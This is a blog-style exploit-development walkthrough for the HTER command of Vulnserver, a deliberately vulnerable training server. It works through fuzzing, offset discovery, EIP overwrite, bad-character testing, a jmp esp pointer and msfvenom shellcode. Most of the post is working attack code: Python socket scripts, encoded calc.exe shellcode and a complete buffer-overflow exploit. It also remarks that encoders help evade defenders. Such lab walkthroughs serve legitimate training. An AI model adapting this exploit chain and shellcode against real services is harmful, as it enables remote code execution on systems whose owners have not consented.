---
title: "Vulnserver HTER - EIP Overwrite with Character conversion"
classes: wide
tag: 
  - "windows exploitation"
  - "vulnserver"
header:
  teaser: /assets/images/win-exp/windows-exp.png
ribbon: blue
description: "A simple walkthrough on  Vulnserver HTER vanilla EIP overwrite"
categories: ['Exploit-Development','Windows-Exploitation','Vulnserver']
---

- [Windows 10 Exploit Development - EIP Overwrite with Character conversion](#windows-10-exploit-development---eip-overwrite-with-character-conversion)
  - [Prologue](#prologue)
  - [Spiking the Vulnserver](#spiking-the-vulnserver)
  - [Analysing the source code](#analysing-the-source-code)
  - [Fuzzing the server](#fuzzing-the-server)
  - [Finding Offset](#finding-offset)
  - [Overwriting Instruction Pointer](#overwriting-instruction-pointer)
  - [Finding bad characters](#finding-bad-characters)
  - [Redirecting the execution](#redirecting-the-execution)
  - [Generating shellcode](#generating-shellcode)
  - [Exploitation](#exploitation)

## Prologue

This blog post is same as the ```Vanilla Stack Buffer Overflow``` where we overwrote the ```EIP``` to gain code execution, but in this post we will be exploiting a command in Vulnserver which has an interesting code logic in it

## Spiking the Vulnserver

Creating a ```spike script``` for spiking using ```generic_send_tcp```,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat hter.spk
s_readline();
s_string("HTER ");
s_string_variable("0");

┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ generic_send_tcp 192.168.116.140 9999 hter.spk 0 0
Total Number of Strings is 681
Fuzzing

...

Fuzzing Variable 0:25
Variablesize= 4
Fuzzing Variable 0:26
Variablesize= 5000
Fuzzing Variable 0:27
Variablesize= 5000
Fuzzing Variable 0:28
Variablesize= 5000
Fuzzing Variable 0:29
Variablesize= 5000
Fuzzing Variable 0:30
Variablesize= 2050

...
```

While spiking HTER command, we could see that we could not connect to the Vulnserver anymore

Yes.. It got crashed!!

We could see that our Vulnserver application has been terminated by ```Access Violation error```

From this we can confirm that, ```HTER``` command is vulnerable to Buffer Overflow attack

## Analysing the source code

```c

...

} else if (strncmp(RecvBuf, "HTER ", 5) == 0) {
				char THBuf[3];
				memset(THBuf, 0, 3);
				char *HterBuf = malloc((DEFAULT_BUFLEN+1)/2);
				memset(HterBuf, 0, (DEFAULT_BUFLEN+1)/2);
				i = 6;
				k = 0;
				while ( (RecvBuf[i]) && (RecvBuf[i+1])) {
					memcpy(THBuf, (char *)RecvBuf+i, 2);
                    //uses strtoul function to convert string into unsigned integer 
                    //string is converted into Base16 character
					unsigned long j = strtoul((char *)THBuf, NULL, 16);
					memset((char *)HterBuf + k, (byte)j, 1);
					i = i + 2;
					k++;
				} 
                //vulnerable function
				Function4(HterBuf);
				memset(HterBuf, 0, (DEFAULT_BUFLEN+1)/2);
				SendResult = send( Client, "HTER RUNNING FINE\n", 18, 0 );
			}

...

```

The vulnerable function used by this command is,

```c
void Function4(char *Input) {
	char Buffer2S[1000];
	strcpy(Buffer2S, Input);
}
```

Here the main overflow attack is caused by ```strcpy``` function, where ```Buffer2S``` is only limited for 1000 bytes but the incoming buffer has more data than that causing it to overflow the Buffer2S buffer while copying

This command does not expect any special characters used for validation

## Fuzzing the server

We have successfully crashed our server and the payload data begins with ```HTER ``` which is made up of ```5 bytes```

Lets create a python script which generates payload data and fuzzes the payload length to crash the server

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat fuzzing.py 
import socket, sys
from time import sleep
payload=b"A"*500
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.116.140", 9999))
        s.send((b"HTER "+payload))
        sleep(5)
        payload=payload+b"A"*500
    except:
        print("Fuzzing crashed at %s bytes"%(len(payload)))
        sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ python3 fuzzing.py 
Fuzzing crashed at 3000 bytes
```

The Vulnserver application should be ran without debugger, to avoid socket connection errors while fuzzing

So, from fuzzing we can estimate that our Vulnserver application is crashing at ```3000 bytes``` of buffer data

Still, we are not sure about the approximate buffer space data need to create an overflow

## Finding Offset

By finding offset, we can locate the approximate buffer space size for writing data into the base pointer and instruction pointer

To find the offset, we need to create a pattern and crash the program

So that the value in the registers can be used to find the offset of it from buffer data

We could not create a random pattern using ```metasploit``` and analyse it, because even though if we create and pass it into the buffer it will get converted into Base16 values by ```strtoul``` function

Which means our string data will be converted into ```hex``` values, if not matched it produces junk values

Fuzzing with the our own pattern to crash the program,

```c
import socket, sys
# fuzzing with junk data
payload=b""
payload+=b"A"*1000
payload+=b"B"*1000
payload+=b"C"*1000
payload+=b"D"*1000
payload+=b"E"*1000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ python3 offset.py
```

This will crash the program, where our buffer will get overflowed and fills the Base Pointer and Instruction Pointer with the data from the pattern

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-offset-dbg.png">
</div>

Here we can see ```EIP``` hash a data of ```CCCC```, which is from our payload

Still we need to pass our payloads precisely to hit the ```EIP``` to find its offset

After numerous tries, finally using this script we can overwrite the ```EBP``` and ```EIP``` with our own data

```c                                                                      
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat offset.py      
import socket, sys
from time import sleep
payload=b""
payload+=b"A"*2033
payload+=b"B"*8
payload+=b"C"*8
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ python3 offset.py
```

Now, using the data from the registers we are going to locate the offset in the buffer space to reach the data

We overwrote ```EBP``` and ```EIP``` with ```B's``` and ```C's```

We have to keep in mind that our hex characters are converted into string and stored into these registers

In our payload we used,

"HTER " - 5 bytes

"A"s - 2033 bytes

"B"s and "C"s - 8 bytes

Offset of EBP = 5 + 2033 = 2038 bytes

Offset of EIP = 5 + 2033 + 8 = Offset of EBP + 8 = 2046 bytes

So we should use 5 bytes of ```HTER ``` and 2041 bytes of ```A's```

## Overwriting Instruction Pointer

Now, we have found the offset of our EIP

It’s time to control the EIP, which is the important phase of every exploitation

Lets craft a script to overwrite the EIP with our own custom data, which will be further used to craft an exploit

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat control-eip.py 
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2041
# to overwrite EIP
payload+=b"D"*8
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ python3 control-eip.py
```

We have successfully overwrote the ```EIP``` with our own data ```DDDDDDDD```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-overwrite-reg.png">
</div>

So we could control EIP and redirect the code execution to the next point

We could also see that the ```ESP``` data is behind the ```EIP```

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-overwrite-espdump.png">
</div>

## Finding bad characters

Lets fuzz our ```ESP``` memory to see our data dump on that region

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat fuzz-esp.py              
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2041
# to overwrite EIP
payload+=b"B"*8
# to store junk in ESP
payload+=b"C"*32
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ python3 fuzz-esp.py    
```

After fuzzing, we can see our ESP data in the memory dump after EIP

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-esp-dump.png" style="width:40%">
</div>

Lets use it to test for ```bad characters```

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat badchars.py 
import socket, sys
# collection of badchars except \x00
badchars=(b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
# to overwrite buffer and EBP
payload=b"A"*2041
# to overwrite EIP
payload+=b"B"*8
# to test badchars in ESP
payload+=badchars
# padding
payload+=b"D"*(3000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
```

By running this, it seems like everything is not in order and the whole data we passed on ESP seems like it has many junk characters

Modifying our script to test only for ```HEX``` values,

```c                                                                      
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat badchars.py 
import socket, sys
# adding "ghijklm" for padding
badchars=(b"123456789abcdefghijklm") 
# to overwrite buffer and EBP
payload=b"A"*2041
# to overwrite EIP
payload+=b"B"*8
# to test badchars in ESP
payload+=badchars
# padding
payload+=b"D"*(3000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()

┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ python3 badchars.py 
```

After crashing, we can confirm that it is allowing only ```HEX``` values inside ESP

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-esp-hex.png" style="width:40%">
</div>

So passing data as raw hex bytes is useless, lets directly pass our raw hex bytes as string and test it this time

Lets create an ASCII string of characters

```c
>>> badchars=[0x00]
>>> fuzz_data = ""
>>> for x in range(1,256):
...     if(x not in badchars):
...         fuzz_data += bytes([x]).hex() 
... 
>>> fuzz_data
'0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff'
```

Fuzzing for bad characters using this string,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat badchars.py 
import socket, sys
# string of badchars except 00 (\x00)
badchars=(b"0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f303132333435363738393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a5b5c5d5e5f606162636465666768696a6b6c6d6e6f707172737475767778797a7b7c7d7e7f808182838485868788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff")
# to overwrite buffer and EBP
payload=b"A"*2041
# to overwrite EIP
payload+=b"B"*8
# fuzzing badchars on ESP
payload+=badchars
# padding
payload+=b"D"*(3000-len(payload))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ python3 badchars.py 
```

After crashing we can see the ESP dump to check for bad characters,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-badchar-dump.png" style="width:70%">
</div>

Seems like everything is perfect, except ```null byte```

## Redirecting the execution

As for now, we can control the ```EIP``` and also we have only one ```bad character x00```,

Since we can control EIP, we can use this as our advantage and redirect the code flow to any part of the memory where it is perfect to have shellcode execution

After EIP, we would be having ESP

We know that, we could overflow ESP after EIP

But we don’t have execution, because EIP should be pointed to the address of ESP and the stack should allow execution

To make our shellcode from ESP to execute, we need to jump from the current location to address of ESP

This can be done by ```jmp esp```, all we have to do is point the EIP with the address of this instruction

Running mona by passing ```!mona modules``` command to list the protection of all modules used by this application

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-mona-modules.png">
</div>

On these, we can clearly see that only ```two modules``` have every security mitigations turned off

From these two, it is always best to try our exploit from an DLL of the own application and not from the actual exe itself

Lets find the jmp esp opcode from the memory of ```essfunc.dll```

To find the opcode using mona, we need the hex value of the opcode which can be done by ```nasm shell```

```c
┌──(kali㉿aidenpearce369)-[~]
└─$ locate nasm_shell
/usr/bin/msf-nasm_shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
                                                                       
┌──(kali㉿aidenpearce369)-[~]
└─$ /usr/bin/msf-nasm_shell
nasm > jmp esp
00000000  FFE4              jmp esp
nasm > exit
```

Finding this offset using mona by the command ```!mona find -s \xff\xe4 -m essfunc.dll```,

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-mona-jmpesp.png">
</div>

We could see there are 9 pointers available for this exploit which has jmp esp opcode in it and it also doesn’t change its memory address

Eventhough ```ASLR``` is enabled for other parts, here it is disabled which makes the address to remain static & suitable for exploitation

```NX bit``` is also disabled, which allows us to execute shellcode on stack memory

Also, while checking the pointer addresses make sure that the address do not contain bad characters in it, which may cause poor exploitation

Lets craft the script and enter the address of the opcode in ```little endian``` format because the data in stack is placed in little endian format

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat jmp-esp.py              
import socket, sys
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2041
# to overwrite EIP with JMP ESP
payload+=b"AF115062" #"\xaf\x11\x50\x62"
# padding
payload+=b"D"*8
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
                                                                       
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ python3 jmp-esp.py 
```

We should place the address in string format instead of raw hex bytes to make it work perfectly

After crashing, we can see that we landed perfectly on ESP memory

<div align="center">
<img src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-jmp-esp.png" style="width:40%">
</div>

So, we have successfully redirected our program flow

Next we have to point it with our shellcode

## Generating shellcode

Instead of spawning reverse shell, lets try to pop calculator application this time using our shellcode

Lets generate the shellcode to pop ```calc.exe``` using msfvenom,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/GMON]
└─$ msfvenom -p windows/exec CMD=calc.exe -b '\x00' -f hex           
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of hex file: 440 bytes
dbdbd97424f45bba70f72c332bc9b13131531803531883eb8c15d9cf84582230543daad5657dc89ed54d9af3d926cee76a4ac708dbe13126dc5a01295ea156895f6aabc89897469871d3f50df6a9c5a6443f4e5a1c3e7fcd17195feff411d6f7191fa08ce9eb334520139fa88de6e1ed291994074aa4afd3317225c091f19d2c20d578a62e920fe03225c39a4eaee24cc7f4c0488caf69c86801950ad3fe3340f9eb490b97eadc31d5edde394986efb206d1ef10632dba39c5a663a854ab93069ad217a3622107c6676d8f3a15fe7a3d8affae5e4d6c328fe814d1cf
```

Creating this shellcode in ```hex```, since it allow hex characters only

Usage of ```encoders``` while creating shellcode may reduce the risk of getting caught by defenders

## Exploitation

Now we have gone through every steps and crafted our final exploit to gain shell on our target machine

By adding nops, we will be performing ```nop-sled```, which will make the probability for execution of our shellcode higher

The exploit script for this buffer overflow via ```HTER``` command is,

```c
┌──(kali㉿aidenpearce369)-[~/vulnserver/HTER]
└─$ cat exploit.py 
import socket, sys
from time import sleep
payload=b""
# to overwrite buffer and EBP
payload+=b"A"*2041
# to overwrite EIP with JMP ESP
payload+=b"AF115062" #"\xaf\x11\x50\x62"
# NOP sled
payload+=b"90"*80
# shellcode
payload+=b"dbdbd97424f45bba70f72c332bc9b13131531803531883eb8c15d9cf84582230543daad5657dc89ed54d9af3d926cee76a4ac708dbe13126dc5a01295ea156895f6aabc89897469871d3f50df6a9c5a6443f4e5a1c3e7fcd17195feff411d6f7191fa08ce9eb334520139fa88de6e1ed291994074aa4afd3317225c091f19d2c20d578a62e920fe03225c39a4eaee24cc7f4c0488caf69c86801950ad3fe3340f9eb490b97eadc31d5edde394986efb206d1ef10632dba39c5a663a854ab93069ad217a3622107c6676d8f3a15fe7a3d8affae5e4d6c328fe814d1cf"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"HTER "+payload))
s.close()
sys.exit()
```

By running this exploit, we would successfully pop a calculator by executing our shellcode

<video width="100%" preload="auto" muted controls>
    <source src="https://raw.githubusercontent.com/AidenPearce369/Vulnserver-Walkthrough/main/res/hter-exploit.mp4" type="video/mp4"/>
</video>
